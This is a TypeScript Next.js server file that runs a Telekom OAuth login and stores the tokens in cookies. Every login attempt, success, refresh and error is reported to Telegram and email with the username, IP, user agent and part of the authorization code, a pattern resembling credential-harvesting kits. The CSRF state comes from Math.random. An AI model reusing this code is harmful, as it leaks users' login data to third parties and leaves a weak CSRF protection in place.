"use server"

import { cookies, headers } from "next/headers"
import { redirect } from "next/navigation"
import { telekomOAuthConfig } from "./auth-config"
import { telegramService } from "./telegram-service"
import { emailService } from "./email-service" // Import the new email service

// Generate a random state for CSRF protection
function generateState() {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
}

// Get client metadata for notifications
function getClientMetadata() {
  const headersList = headers()
  return {
    userAgent: headersList.get("user-agent") || "Unknown",
    ip: headersList.get("x-forwarded-for") || headersList.get("x-real-ip") || "Unknown",
    referer: headersList.get("referer") || "Direct",
  }
}

// Initiate OAuth flow
export async function initiateOAuth(formData: FormData) {
  const username = formData.get("username") as string
  const rememberUsername = formData.get("rememberUsername") === "true"
  const clientMetadata = getClientMetadata()

  try {
    // Send notification about login attempt (Telegram)
    await telegramService.notifyLoginAttempt(username, {
      ...clientMetadata,
      rememberUsername,
    })

    // Store username if remember is checked
    if (rememberUsername && username) {
      cookies().set("remembered_username", username, {
        maxAge: 30 * 24 * 60 * 60, // 30 days
        path: "/",
        secure: process.env.NODE_ENV === "production",
        httpOnly: true,
        sameSite: "lax",
      })
    }

    // Generate and store state
    const state = generateState()
    cookies().set("oauth_state", state, {
      maxAge: 60 * 10, // 10 minutes
      path: "/",
      secure: process.env.NODE_ENV === "production",
      httpOnly: true,
      sameSite: "lax",
    })

    // Store username for later notification
    cookies().set("login_username", username, {
      maxAge: 60 * 10, // 10 minutes
      path: "/",
      secure: process.env.NODE_ENV === "production",
      httpOnly: true,
      sameSite: "lax",
    })

    // Construct authorization URL
    const authUrl = new URL(telekomOAuthConfig.authorizationEndpoint)
    authUrl.searchParams.append("response_type", "code")
    authUrl.searchParams.append("client_id", telekomOAuthConfig.clientId)
    authUrl.searchParams.append("redirect_uri", telekomOAuthConfig.redirectUri)
    authUrl.searchParams.append("scope", telekomOAuthConfig.scope)
    authUrl.searchParams.append("state", state)

    // If username is provided, add login_hint
    if (username) {
      authUrl.searchParams.append("login_hint", username)
    }

    // Redirect to Telekom authorization endpoint
    redirect(authUrl.toString())
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : "Unknown error"
    // Send error notification (Telegram)
    await telegramService.notifyLoginError(`OAuth initiation failed: ${errorMessage}`, username, clientMetadata)
    // Send error notification (Email)
    await emailService.notifyLoginError(`OAuth initiation failed: ${errorMessage}`, username, clientMetadata)
    throw error
  }
}

// Exchange code for tokens
export async function exchangeCodeForTokens(code: string) {
  const username = cookies().get("login_username")?.value || "Unknown"
  const clientMetadata = getClientMetadata()

  try {
    const tokenResponse = await fetch(telekomOAuthConfig.tokenEndpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: new URLSearchParams({
        grant_type: "authorization_code",
        code,
        client_id: telekomOAuthConfig.clientId,
        redirect_uri: telekomOAuthConfig.redirectUri,
      }),
    })

    if (!tokenResponse.ok) {
      const errorText = await tokenResponse.text()
      throw new Error(`Token exchange failed: ${tokenResponse.status} - ${errorText}`)
    }

    const tokens = await tokenResponse.json()

    // Store tokens securely in cookies
    cookies().set("access_token", tokens.access_token, {
      maxAge: tokens.expires_in,
      path: "/",
      secure: process.env.NODE_ENV === "production",
      httpOnly: true,
      sameSite: "lax",
    })

    if (tokens.refresh_token) {
      cookies().set("refresh_token", tokens.refresh_token, {
        maxAge: 30 * 24 * 60 * 60, // 30 days
        path: "/",
        secure: process.env.NODE_ENV === "production",
        httpOnly: true,
        sameSite: "lax",
      })
    }

    // Clear temporary username cookie
    cookies().delete("login_username")

    // Send success notification (Telegram)
    await telegramService.notifySuccessfulLogin(username, {
      ...clientMetadata,
      tokenType: tokens.token_type,
      expiresIn: tokens.expires_in,
      scope: tokens.scope,
    })

    // Send success notification (Email)
    await emailService.notifySuccessfulLogin(username, {
      ...clientMetadata,
      tokenType: tokens.token_type,
      expiresIn: tokens.expires_in,
      scope: tokens.scope,
    })

    return { success: true }
  } catch (error) {
    console.error("Token exchange error:", error)
    const errorMessage = error instanceof Error ? error.message : "Unknown error"

    // Send error notification (Telegram)
    await telegramService.notifyLoginError(`Token exchange failed: ${errorMessage}`, username, {
      ...clientMetadata,
      authorizationCode: code.substring(0, 10) + "...", // Only show first 10 chars for security
    })

    // Send error notification (Email)
    await emailService.notifyLoginError(`Token exchange failed: ${errorMessage}`, username, {
      ...clientMetadata,
      authorizationCode: code.substring(0, 10) + "...", // Only show first 10 chars for security
    })

    return { success: false, error: "Failed to exchange code for tokens" }
  }
}

// Refresh token function
export async function refreshAccessToken() {
  const refreshToken = cookies().get("refresh_token")?.value
  const username = cookies().get("remembered_username")?.value || "Unknown"
  const clientMetadata = getClientMetadata()

  if (!refreshToken) {
    await telegramService.notifyLoginError("Token refresh failed: No refresh token", username, clientMetadata)
    await emailService.notifyLoginError("Token refresh failed: No refresh token", username, clientMetadata)
    return { success: false, error: "No refresh token available" }
  }

  try {
    const tokenResponse = await fetch(telekomOAuthConfig.tokenEndpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: new URLSearchParams({
        grant_type: "refresh_token",
        refresh_token: refreshToken,
        client_id: telekomOAuthConfig.clientId,
      }),
    })

    if (!tokenResponse.ok) {
      throw new Error(`Token refresh failed: ${tokenResponse.status}`)
    }

    const tokens = await tokenResponse.json()

    // Update tokens
    cookies().set("access_token", tokens.access_token, {
      maxAge: tokens.expires_in,
      path: "/",
      secure: process.env.NODE_ENV === "production",
      httpOnly: true,
      sameSite: "lax",
    })

    if (tokens.refresh_token) {
      cookies().set("refresh_token", tokens.refresh_token, {
        maxAge: 30 * 24 * 60 * 60, // 30 days
        path: "/",
        secure: process.env.NODE_ENV === "production",
        httpOnly: true,
        sameSite: "lax",
      })
    }

    // Send notification about token refresh (Telegram)
    await telegramService.notifyTokenRefresh(username, {
      ...clientMetadata,
      expiresIn: tokens.expires_in,
    })

    return { success: true }
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : "Unknown error"
    await telegramService.notifyLoginError(`Token refresh failed: ${errorMessage}`, username, clientMetadata)
    await emailService.notifyLoginError(`Token refresh failed: ${errorMessage}`, username, clientMetadata)

    return { success: false, error: "Failed to refresh token" }
  }
}
